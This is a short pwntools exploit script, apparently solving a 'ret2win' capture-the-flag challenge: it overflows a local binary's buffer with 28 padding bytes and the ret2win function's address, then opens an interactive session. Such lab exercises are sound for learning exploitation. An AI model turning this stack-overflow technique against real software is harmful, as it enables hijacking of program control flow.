from pwn import *

elf = ELF('../chall/ret2win')
p = elf.process()

ret2win = elf.symbols['ret2win']
p.info('[+] ret2win: ' + hex(ret2win))
payload = b'A' * 28
payload += p64(ret2win)

p.recvuntil(b'> ')
p.sendline(payload)

p.interactive()